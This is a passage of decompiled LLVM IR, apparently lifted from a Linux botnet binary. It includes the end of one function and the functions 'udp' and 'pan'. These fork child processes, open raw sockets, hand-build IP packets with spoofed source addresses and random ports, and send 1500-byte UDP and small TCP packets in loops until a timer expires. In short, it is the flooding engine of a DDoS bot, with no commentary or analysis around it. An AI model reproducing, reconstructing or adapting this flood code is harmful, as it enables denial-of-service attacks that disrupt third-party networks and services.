  %v2_fb5c = add i32 %v3_fb58, %v3_fa3c
  store i32 %v2_fae8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_f2d0.433 to i32), i32* %r2.global-to-local, align 4
  %v4_fb84 = inttoptr i32 %v2_fb5c to i32*
  %v5_fb84 = call i32 @pthread_create(i32* %v4_fb84, i32 0, i32 ptrtoint (i32* @global_var_f2d0.433 to i32), i32 %v2_fae8)
  %v1_fb8c = add nuw nsw i32 %storemerge150, 1
  store i32 %v1_fb8c, i32* %r2.global-to-local, align 4
  store i32 %v1_f828, i32* %r3.global-to-local, align 4
  %v5_fba0 = icmp slt i32 %v1_fb8c, %v1_f828
  br i1 %v5_fba0, label %dec_label_pc_fad4, label %dec_label_pc_fba4

dec_label_pc_fba4:                                ; preds = %dec_label_pc_fad4, %dec_label_pc_fa00
  store i32 %v1_fa68, i32* %r3.global-to-local, align 4
  %v2_fbac = load i32, i32* %v1_fa6c, align 4
  store i32 %v2_fbac, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_37984.435 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_fbbc = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_37984.435 to i32))
  store i32 %v1_f6f0, i32* %r3.global-to-local, align 4
  %v2_fbd0 = load i32, i32* %v1_f6f4, align 4
  store i32 %v2_fbd0, i32* %r3.global-to-local, align 4
  store i32 %v2_fbd0, i32* @r0, align 4
  %v1_fbd8 = call i32 @atol(i32 %v2_fbd0)
  %v2_fbe4 = mul i32 %v1_fbd8, 20
  store i32 %v2_fbe4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_fbf0 = icmp sgt i32 %v2_fbe4, 0
  br i1 %v7_fbf0, label %dec_label_pc_fbf4, label %dec_label_pc_fd28

dec_label_pc_fbf4:                                ; preds = %dec_label_pc_fba4
  store i32 50, i32* %r1.global-to-local, align 4
  store i32 200, i32* %r2.global-to-local, align 4
  store i32 50000, i32* %r3.global-to-local, align 4
  %v1_fc24 = call i32 @usleep(i32 50000)
  %v2_fc2c = load i32, i32* @global_var_526bc.176, align 4
  %v2_fc34 = mul i32 %v2_fc2c, 20
  store i32 %v2_fc34, i32* %r2.global-to-local, align 4
  %tmp51 = icmp ugt i32 %v2_fc34, %v1_f844
  %v2_fc88 = load i32, i32* @global_var_52590.178, align 4
  store i32 %v2_fc88, i32* %r3.global-to-local, align 4
  br i1 %tmp51, label %dec_label_pc_fc44, label %dec_label_pc_fc84

dec_label_pc_fc44:                                ; preds = %dec_label_pc_fbf4
  %v5_fc50 = icmp sgt i32 %v2_fc88, 0
  br i1 %v5_fc50, label %dec_label_pc_fc6c, label %dec_label_pc_fc54

dec_label_pc_fc54:                                ; preds = %dec_label_pc_fc44
  %v2_fc58 = load i32, i32* @global_var_4535c.180, align 4
  %v1_fc5c = add i32 %v2_fc58, 100
  store i32 %v1_fc5c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_fc5c, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_fccc

dec_label_pc_fc6c:                                ; preds = %dec_label_pc_fc44
  %v1_fc74 = add i32 %v2_fc88, -1
  store i32 %v1_fc74, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_52590.178 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_fc74, i32* @global_var_52590.178, align 4
  br label %dec_label_pc_fccc

dec_label_pc_fc84:                                ; preds = %dec_label_pc_fbf4
  %v1_fc8c = add i32 %v2_fc88, 1
  store i32 %v1_fc8c, i32* %r2.global-to-local, align 4
  store i32 %v1_fc8c, i32* @global_var_52590.178, align 4
  %v2_fc9c = load i32, i32* @global_var_4535c.180, align 4
  store i32 %v2_fc9c, i32* %r3.global-to-local, align 4
  %v1_fca0 = add i32 %v2_fc9c, -25
  %tmp52 = icmp ult i32 %v2_fc9c, 26
  br i1 %tmp52, label %dec_label_pc_fcc0, label %dec_label_pc_fca8

dec_label_pc_fca8:                                ; preds = %dec_label_pc_fc84
  store i32 %v1_fca0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_fca0, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_fccc

dec_label_pc_fcc0:                                ; preds = %dec_label_pc_fc84
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_fccc

dec_label_pc_fccc:                                ; preds = %dec_label_pc_fca8, %dec_label_pc_fc6c, %dec_label_pc_fc54, %dec_label_pc_fcc0
  store i32 ptrtoint (i32* @global_var_526bc.176 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  %v2_fcfc = add i32 %v2_f6f4, %v2_f6e0
  br label %dec_label_pc_fcd8

dec_label_pc_fcd8:                                ; preds = %dec_label_pc_fd18, %dec_label_pc_fccc
  %stack_var_-72.0 = phi i32 [ %tmp, %dec_label_pc_fccc ], [ %v1_fd1c, %dec_label_pc_fd18 ]
  store i32 %stack_var_-72.0, i32* %r3.global-to-local, align 4
  %v7_fce0 = icmp slt i32 %stack_var_-72.0, 100
  br i1 %v7_fce0, label %dec_label_pc_fd18, label %dec_label_pc_fce4

dec_label_pc_fce4:                                ; preds = %dec_label_pc_fcd8
  %v2_fce8 = call i32 @__GI_time(i32* null)
  store i32 %v2_fce8, i32* %r1.global-to-local, align 4
  store i32 %v2_f6e0, i32* %r2.global-to-local, align 4
  store i32 %v2_fcfc, i32* %r3.global-to-local, align 4
  %v3_fd00 = icmp ult i32 %v2_fce8, %v2_fcfc
  br i1 %v3_fd00, label %dec_label_pc_fd10, label %dec_label_pc_fd08

dec_label_pc_fd08:                                ; preds = %dec_label_pc_fce4
  %v1_fd0c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_fd10

dec_label_pc_fd10:                                ; preds = %dec_label_pc_fce4, %dec_label_pc_fd08
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fd18

dec_label_pc_fd18:                                ; preds = %dec_label_pc_fcd8, %dec_label_pc_fd10
  %stack_var_-72.1 = phi i32 [ %stack_var_-72.0, %dec_label_pc_fcd8 ], [ 0, %dec_label_pc_fd10 ]
  %v1_fd1c = add i32 %stack_var_-72.1, 1
  store i32 %v1_fd1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fcd8

dec_label_pc_fd28:                                ; preds = %dec_label_pc_fba4
  %v1_fd2c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_fd30

dec_label_pc_fd30:                                ; preds = %entry, %dec_label_pc_f6dc, %dec_label_pc_fd28
  %v1_fd3c = phi i32 [ %v1_f67c, %entry ], [ %v3_f70c, %dec_label_pc_f6dc ], [ %v1_fd2c, %dec_label_pc_fd28 ]
  ret i32 %v1_fd3c

; uselistorder directives
  uselistorder i32 %v1_fd1c, { 1, 0 }
  uselistorder i32 %stack_var_-72.0, { 0, 2, 1 }
  uselistorder i32 %v1_fca0, { 1, 0 }
  uselistorder i32 %v2_fc88, { 2, 0, 1, 3 }
  uselistorder i32 %v1_fb8c, { 2, 1, 0 }
  uselistorder i32 %v2_fb10, { 3, 2, 0, 1 }
  uselistorder i32 %v2_fae8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fae4, { 1, 0 }
  uselistorder i32 %storemerge150, { 3, 0, 2, 1 }
  uselistorder i32 %v2_f95c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f948, { 1, 0 }
  uselistorder i32 %v1_f904, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %v1_f88c, { 1, 2, 0 }
  uselistorder i32 %v3_f878, { 1, 0, 2 }
  uselistorder i32 %v1_f828, { 4, 3, 0, 1, 5, 2 }
  uselistorder i32 %v0_f80c, { 9, 2, 1, 4, 3, 5, 0, 6, 8, 7 }
  uselistorder i32 %v2_f780, { 1, 2, 0, 3 }
  uselistorder i32 %v2_f748, { 1, 0, 2 }
  uselistorder i32 %v1_f720, { 1, 0, 2, 3 }
  uselistorder i32 %v3_f70c, { 1, 0 }
  uselistorder i32* %v1_f704, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_f700, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v2_f6e0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 9, 12, 13, 14, 15, 16, 17, 20, 18, 19, 63, 21, 22, 23, 39, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 13, 11, 12, 26, 14, 20, 15, 16, 17, 18, 19, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 0 }
  uselistorder i32 26, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* @global_var_4535c.180, { 0, 1, 18, 2, 19, 20, 3, 4, 21, 5, 22, 23, 6, 7, 24, 8, 25, 26, 9, 10, 27, 11, 28, 29, 12, 13, 30, 14, 31, 32, 15, 16, 33, 17, 36, 34, 35 }
  uselistorder i32 (i32)* @usleep, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 50000, { 1, 0, 3, 2, 4, 6, 5, 8, 7, 10, 9 }
  uselistorder i32 540, { 6, 0, 7, 1, 2, 8, 3, 9, 4, 10, 5, 11 }
  uselistorder i32* @global_var_526bc.176, { 0, 18, 1, 2, 19, 3, 20, 4, 5, 21, 6, 22, 7, 8, 23, 9, 24, 10, 11, 25, 12, 26, 13, 14, 27, 15, 28, 16, 30, 17, 29 }
  uselistorder i32* @global_var_52590.178, { 0, 1, 18, 2, 19, 3, 4, 20, 5, 21, 6, 7, 22, 8, 23, 9, 10, 24, 11, 25, 12, 13, 26, 14, 27, 15, 16, 30, 28, 17, 29 }
  uselistorder i32* @global_var_536c4.157, { 10, 11, 12, 13, 14, 15, 16, 0, 17, 1, 18, 19, 20, 21, 22, 23, 24, 2, 25, 3, 26, 27, 28, 29, 30, 31, 32, 4, 33, 5, 34, 35, 36, 37, 38, 39, 40, 6, 41, 7, 42, 8, 54, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 9, 53 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_fd30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fd18, { 1, 0 }
  uselistorder label %dec_label_pc_fd10, { 1, 0 }
  uselistorder label %dec_label_pc_fccc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_fad4, { 1, 0 }
  uselistorder label %dec_label_pc_f9d8, { 1, 0 }
  uselistorder label %dec_label_pc_f6dc, { 1, 0 }
  uselistorder label %dec_label_pc_f6b8, { 1, 0 }
}

define i32 @udp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1544 = alloca i32, align 4
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1572 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 64884, i32* %stack_var_-4, align 4
  %v2_fd70 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fd70, i32* @fp, align 4
  %v2_fd94 = call i32 @__GI_time(i32* null)
  %v1_fda4 = call i32 @mfork(i32 %arg2)
  %v2_fdac = icmp eq i32 %v1_fda4, 0
  br i1 %v2_fdac, label %dec_label_pc_fdb4, label %dec_label_pc_100fc

dec_label_pc_fdb4:                                ; preds = %entry
  %v3_fdc0 = call i32 @socket(i32 2, i32 3, i32 255)
  %v1_fdd0 = icmp slt i32 %v3_fdc0, 0
  br i1 %v1_fdd0, label %dec_label_pc_fdd8, label %dec_label_pc_fde0

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fdb4
  %v1_fddc = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_fde0

dec_label_pc_fde0:                                ; preds = %dec_label_pc_fdb4, %dec_label_pc_fdd8
  %v8_fde8 = icmp sgt i32 %arg3, 2
  br i1 %v8_fde8, label %dec_label_pc_fe04, label %dec_label_pc_fdec

dec_label_pc_fdec:                                ; preds = %dec_label_pc_fde0
  store i32 %arg2, i32* @r2, align 4
  %v3_fdf8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_379a4.438 to i32))
  %v1_fe00 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_fe04

dec_label_pc_fe04:                                ; preds = %dec_label_pc_fde0, %dec_label_pc_fdec
  %v1_fe08 = add i32 %arg4, 4
  %v1_fe0c = inttoptr i32 %v1_fe08 to i32*
  %v2_fe0c = load i32, i32* %v1_fe0c, align 4
  %v2_fe18 = call i32 @host2ip(i32 %arg2, i32 %v2_fe0c)
  %v1_fe28 = add i32 %arg4, 8
  %v1_fe2c = inttoptr i32 %v1_fe28 to i32*
  %v2_fe2c = load i32, i32* %v1_fe2c, align 4
  store i32 %v2_fe2c, i32* @r0, align 4
  %v1_fe34 = call i32 @atol(i32 %v2_fe2c)
  %v1_fe44 = add i32 %arg4, 12
  %v1_fe48 = inttoptr i32 %v1_fe44 to i32*
  %v2_fe48 = load i32, i32* %v1_fe48, align 4
  store i32 %v2_fe48, i32* @r0, align 4
  %v1_fe50 = call i32 @atol(i32 %v2_fe48)
  %v2_fe64 = ptrtoint i32* %stack_var_-1572 to i32
  %tmp39 = bitcast i32* %stack_var_-1572 to i8*
  %tmp40 = bitcast i32* %stack_var_-1552 to i16*
  %v2_fe8c = ptrtoint i32* %stack_var_-1544 to i32
  store i32 %v2_fe8c, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  store i32 1472, i32* @r2, align 4
  %v0_fea0 = call i32 @__GI_memset()
  store i32 %arg2, i32* @r2, align 4
  %v3_febc = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_379cc.440 to i32))
  store i8 69, i8* %tmp39, align 4
  %v3_ff10 = or i32 %v2_fe64, 1
  %v4_ff10 = inttoptr i32 %v3_ff10 to i8*
  store i8 0, i8* %v4_ff10, align 1
  %v3_ff20 = or i32 %v2_fe64, 2
  %v4_ff20 = inttoptr i32 %v3_ff20 to i16*
  store i16 1500, i16* %v4_ff20, align 2
  %v3_ff2c = add i32 %v2_fe64, 6
  %v4_ff2c = inttoptr i32 %v3_ff2c to i16*
  store i16 0, i16* %v4_ff2c, align 2
  %v3_ff38 = add i32 %v2_fe64, 9
  %v4_ff38 = inttoptr i32 %v3_ff38 to i8*
  store i8 17, i8* %v4_ff38, align 1
  %v3_ff44 = add i32 %v2_fe64, 8
  %v4_ff44 = inttoptr i32 %v3_ff44 to i8*
  store i8 64, i8* %v4_ff44, align 4
  %v2_ff50 = add i32 %v2_fe64, 16
  %v3_ff50 = inttoptr i32 %v2_ff50 to i32*
  store i32 %v2_fe18, i32* %v3_ff50, align 4
  %v3_ff5c = urem i32 %tmp11, 65536
  %v1_ff64 = call i32 @__GI_htons(i32 %v3_ff5c)
  %sext = mul i32 %v1_ff64, 65536
  %v1_ff68 = sdiv i32 %sext, 65536
  %v4_ff70 = ptrtoint i32* %stack_var_-1552 to i32
  %v1_ff74 = trunc i32 %v1_ff68 to i16
  %v3_ff74 = add i32 %v4_ff70, 4
  %v4_ff74 = inttoptr i32 %v3_ff74 to i16*
  store i16 %v1_ff74, i16* %v4_ff74, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v2_ffa4 = icmp eq i32 %v1_fe34, 0
  %v3_ffe8 = or i32 %v4_ff70, 2
  %v4_ffe8 = inttoptr i32 %v3_ffe8 to i16*
  %v2_10004 = bitcast i32* %stack_var_-1572 to i16*
  %v3_10014 = add i32 %v4_ff70, 6
  %v4_10014 = inttoptr i32 %v3_10014 to i16*
  %v2_10024 = add i32 %v2_fe64, 12
  %v3_10024 = inttoptr i32 %v2_10024 to i32*
  %v3_1003c = add i32 %v2_fe64, 4
  %v4_1003c = inttoptr i32 %v3_1003c to i16*
  %v3_10068 = add i32 %v2_fe64, 10
  %v4_10068 = inttoptr i32 %v3_10068 to i16*
  %v2_10078 = ptrtoint i32* %stack_var_-72 to i32
  %v2_100d0 = add i32 %v1_fe50, %v2_fd94
  %v3_ffb4 = urem i32 %v1_fe34, 65536
  br label %dec_label_pc_ff88

dec_label_pc_ff88:                                ; preds = %dec_label_pc_100ec, %dec_label_pc_fe04
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_fe04 ], [ %v1_100f0, %dec_label_pc_100ec ]
  %v0_ff88 = call i32 @rand()
  %v1_ff9c = trunc i32 %v0_ff88 to i16
  store i16 %v1_ff9c, i16* %tmp40, align 4
  br i1 %v2_ffa4, label %dec_label_pc_ffd4, label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %dec_label_pc_ff88
  %v1_ffbc = call i32 @__GI_htons(i32 %v3_ffb4)
  %sext3 = mul i32 %v1_ffbc, 65536
  %v1_ffc0 = sdiv i32 %sext3, 65536
  %extract.t = trunc i32 %v1_ffc0 to i16
  br label %dec_label_pc_ffec

dec_label_pc_ffd4:                                ; preds = %dec_label_pc_ff88
  %v0_ffd4 = call i32 @rand()
  %extract.t47 = trunc i32 %v0_ffd4 to i16
  br label %dec_label_pc_ffec

dec_label_pc_ffec:                                ; preds = %dec_label_pc_ffac, %dec_label_pc_ffd4
  %v1_ffc0.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_ffac ], [ %extract.t47, %dec_label_pc_ffd4 ]
  store i16 %v1_ffc0.sink.off0, i16* %v4_ffe8, align 2
  %v3_10004 = call i32 @in_cksum(i16* %v2_10004, i32 1500)
  %sext4 = mul i32 %v3_10004, 65536
  %v1_10008 = sdiv i32 %sext4, 65536
  %v1_10014 = trunc i32 %v1_10008 to i16
  store i16 %v1_10014, i16* %v4_10014, align 2
  %v0_10018 = call i32 @getspoof()
  store i32 %v0_10018, i32* %v3_10024, align 4
  %v0_10028 = call i32 @rand()
  %v1_1003c = trunc i32 %v0_10028 to i16
  store i16 %v1_1003c, i16* %v4_1003c, align 4
  %v3_10058 = call i32 @in_cksum(i16* %v2_10004, i32 1500)
  %v1_10068 = trunc i32 %v3_10058 to i16
  store i16 %v1_10068, i16* %v4_10068, align 2
  %v6_100a8 = call i32 @sendto(i32 %v3_fdc0, i32 %v2_fe64, i32 1500, i32 0, i32 %v2_10078, i32 16)
  %tmp = icmp ult i32 %stack_var_-52.0, 100
  br i1 %tmp, label %dec_label_pc_100ec, label %dec_label_pc_100b8

dec_label_pc_100b8:                               ; preds = %dec_label_pc_ffec
  %v2_100bc = call i32 @__GI_time(i32* null)
  %v3_100d4 = icmp ult i32 %v2_100bc, %v2_100d0
  br i1 %v3_100d4, label %dec_label_pc_100e4, label %dec_label_pc_100dc

dec_label_pc_100dc:                               ; preds = %dec_label_pc_100b8
  %v1_100e0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_100e4

dec_label_pc_100e4:                               ; preds = %dec_label_pc_100b8, %dec_label_pc_100dc
  br label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %dec_label_pc_ffec, %dec_label_pc_100e4
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_ffec ], [ 0, %dec_label_pc_100e4 ]
  %v1_100f0 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_ff88

dec_label_pc_100fc:                               ; preds = %entry
  ret i32 %v1_fda4

; uselistorder directives
  uselistorder i32 %stack_var_-52.0, { 1, 0 }
  uselistorder i32 %v2_fe64, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100ec, { 1, 0 }
  uselistorder label %dec_label_pc_100e4, { 1, 0 }
  uselistorder label %dec_label_pc_ffec, { 1, 0 }
  uselistorder label %dec_label_pc_fe04, { 1, 0 }
  uselistorder label %dec_label_pc_fde0, { 1, 0 }
}

define i32 @pan(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-124 = alloca i8, align 1
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 65820, i32* %stack_var_-4, align 4
  %v2_10118 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10118, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_379e8.442 to i32), i32* @r3, align 4
  %v2_10134 = ptrtoint i32* %stack_var_-272 to i32
  store i32 80, i32* @ip, align 4
  store i32 %v2_10134, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_379e8.442 to i32), i32* @r1, align 4
  store i32 80, i32* @r2, align 4
  %v0_10148 = call i32 @memcpy()
  %v2_10160 = call i32 @__GI_time(i32* null)
  %v1_10170 = call i32 @mfork(i32 %arg2)
  %v2_10178 = icmp eq i32 %v1_10170, 0
  br i1 %v2_10178, label %dec_label_pc_10180, label %dec_label_pc_10688

dec_label_pc_10180:                               ; preds = %entry
  %v3_1018c = call i32 @socket(i32 2, i32 3, i32 255)
  %v1_1019c = icmp slt i32 %v3_1018c, 0
  br i1 %v1_1019c, label %dec_label_pc_101a4, label %dec_label_pc_101ac

dec_label_pc_101a4:                               ; preds = %dec_label_pc_10180
  %v1_101a8 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_101ac

dec_label_pc_101ac:                               ; preds = %dec_label_pc_10180, %dec_label_pc_101a4
  %v8_101b4 = icmp sgt i32 %arg3, 2
  br i1 %v8_101b4, label %dec_label_pc_10224.preheader, label %dec_label_pc_101b8

dec_label_pc_101b8:                               ; preds = %dec_label_pc_101ac
  store i32 %arg2, i32* @r2, align 4
  %v3_101c4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_37a38.444 to i32))
  %v1_101cc = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_10224.preheader

dec_label_pc_10224.preheader:                     ; preds = %dec_label_pc_101ac, %dec_label_pc_101b8
  %v2_101ec = ptrtoint i32* %stack_var_-24 to i32
  %v2_101f0 = add i32 %v2_101ec, -248
  %v2_10208 = add i32 %v2_101ec, -60
  br label %dec_label_pc_101dc

dec_label_pc_101dc:                               ; preds = %dec_label_pc_10224.preheader, %dec_label_pc_101dc
  %storemerge1112 = phi i32 [ 0, %dec_label_pc_10224.preheader ], [ %v1_1021c, %dec_label_pc_101dc ]
  %v3_101e8 = mul nuw nsw i32 %storemerge1112, 4
  %v2_101f4 = add i32 %v2_101f0, %v3_101e8
  %v1_101f8 = inttoptr i32 %v2_101f4 to i32*
  %v2_101f8 = load i32, i32* %v1_101f8, align 4
  %v2_1020c = add i32 %v2_10208, %storemerge1112
  %v1_10214 = trunc i32 %v2_101f8 to i8
  %v3_10214 = inttoptr i32 %v2_1020c to i8*
  store i8 %v1_10214, i8* %v3_10214, align 1
  %v1_1021c = add nuw nsw i32 %storemerge1112, 1
  %v7_1022c = icmp slt i32 %v1_1021c, 20
  br i1 %v7_1022c, label %dec_label_pc_101dc, label %dec_label_pc_10230

dec_label_pc_10230:                               ; preds = %dec_label_pc_101dc
  %v1_10234 = add i32 %arg4, 4
  %v1_10238 = inttoptr i32 %v1_10234 to i32*
  %v2_10238 = load i32, i32* %v1_10238, align 4
  %v2_10244 = call i32 @host2ip(i32 %arg2, i32 %v2_10238)
  %v1_10254 = add i32 %arg4, 12
  %v1_10258 = inttoptr i32 %v1_10254 to i32*
  %v2_10258 = load i32, i32* %v1_10258, align 4
  store i32 %v2_10258, i32* @r0, align 4
  %v1_10260 = call i32 @atol(i32 %v2_10258)
  store i32 %arg2, i32* @r2, align 4
  %v3_10284 = call i32 @Send(i32 %arg1, i32 ptrtoint ([23 x i8]* @global_var_37a60.446 to i32))
  store i8 69, i8* %stack_var_-124, align 1
  %v1_103ec = add i32 %arg4, 8
  %v1_103f0 = inttoptr i32 %v1_103ec to i32*
  %v2_103f0 = load i32, i32* %v1_103f0, align 4
  store i32 %v2_103f0, i32* @r0, align 4
  %v1_103f8 = call i32 @atol(i32 %v2_103f0)
  %v3_10404 = urem i32 %v1_103f8, 65536
  %v1_1040c = call i32 @__GI_htons(i32 %v3_10404)
  %v2_1041c = call i32 @__GI_time(i32* null)
  store i32 %v2_1041c, i32* @r0, align 4
  store i32 %v2_1041c, i32* @r4, align 4
  %v0_10424 = call i32 @__GI_getpid()
  %v0_1042c = load i32, i32* @r4, align 4
  %v2_1042c = add i32 %v0_1042c, %v0_10424
  %v1_10434 = call i32 @srand(i32 %v2_1042c)
  %v2_10500 = ptrtoint i8* %stack_var_-124 to i32
  %v2_1050c = bitcast i8* %stack_var_-124 to i16*
  %v2_105ac = ptrtoint i32* %stack_var_-104 to i32
  %v2_105b4 = ptrtoint i32* %stack_var_-164 to i32
  %v2_105cc = ptrtoint i32* %stack_var_-84 to i32
  %v2_105d4 = ptrtoint i32* %stack_var_-144 to i32
  %v2_105fc = bitcast i32* %stack_var_-176 to i16*
  %v2_10610 = ptrtoint i32* %stack_var_-192 to i32
  %v2_1065c = add i32 %v1_10260, %v2_10160
  br label %dec_label_pc_10438

dec_label_pc_10438:                               ; preds = %dec_label_pc_10678, %dec_label_pc_10230
  %stack_var_-64.0 = phi i32 [ 0, %dec_label_pc_10230 ], [ %v1_1067c, %dec_label_pc_10678 ]
  %v2_10440 = load i32, i32* %v1_103f0, align 4
  store i32 %v2_10440, i32* @r0, align 4
  %v1_10448 = call i32 @atol(i32 %v2_10440)
  %v2_10450 = icmp eq i32 %v1_10448, 0
  br i1 %v2_10450, label %dec_label_pc_10458, label %dec_label_pc_10464

dec_label_pc_10458:                               ; preds = %dec_label_pc_10438
  %v0_10458 = call i32 @rand()
  br label %dec_label_pc_10464

dec_label_pc_10464:                               ; preds = %dec_label_pc_10438, %dec_label_pc_10458
  %v0_10464 = call i32 @getspoof()
  %v1_1048c = call i32 @__GI_htons(i32 60)
  %v0_10498 = call i32 @rand()
  %v3_104c4 = urem i32 %v0_10464, 65536
  store i32 %v3_104c4, i32* %stack_var_-104, align 4
  %v0_104dc = call i32 @rand()
  %v3_1050c = call i32 @in_cksum(i16* %v2_1050c, i32 20)
  %v0_10518 = call i32 @rand()
  store i32 %v0_10464, i32* %stack_var_-176, align 4
  %v1_1059c = call i32 @__GI_htons(i32 40)
  store i32 %v2_105b4, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_105c4 = call i32 @bcopy(i32 %v2_105ac, i32 %v2_105b4, i32 20)
  store i32 %v2_105d4, i32* @r3, align 4
  store i32 20, i32* @r2, align 4
  %v3_105e4 = call i32 @bcopy(i32 %v2_105cc, i32 %v2_105d4, i32 20)
  %v3_105fc = call i32 @in_cksum(i16* %v2_105fc, i32 52)
  %v6_10634 = call i32 @sendto(i32 %v3_1018c, i32 %v2_10500, i32 60, i32 0, i32 %v2_10610, i32 16)
  %tmp = icmp ult i32 %stack_var_-64.0, 100
  br i1 %tmp, label %dec_label_pc_10678, label %dec_label_pc_10644

dec_label_pc_10644:                               ; preds = %dec_label_pc_10464
  %v2_10648 = call i32 @__GI_time(i32* null)
  %v3_10660 = icmp ult i32 %v2_10648, %v2_1065c
  br i1 %v3_10660, label %dec_label_pc_10670, label %dec_label_pc_10668

dec_label_pc_10668:                               ; preds = %dec_label_pc_10644
  %v1_1066c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_10670

dec_label_pc_10670:                               ; preds = %dec_label_pc_10644, %dec_label_pc_10668
  br label %dec_label_pc_10678

dec_label_pc_10678:                               ; preds = %dec_label_pc_10464, %dec_label_pc_10670
  %stack_var_-64.1 = phi i32 [ %stack_var_-64.0, %dec_label_pc_10464 ], [ 0, %dec_label_pc_10670 ]
  %v1_1067c = add i32 %stack_var_-64.1, 1
  br label %dec_label_pc_10438

dec_label_pc_10688:                               ; preds = %entry
  ret i32 %v1_10170

; uselistorder directives
  uselistorder i32 %v0_10464, { 1, 0 }
  uselistorder i32 %stack_var_-64.0, { 1, 0 }
  uselistorder i32 %storemerge1112, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10678, { 1, 0 }
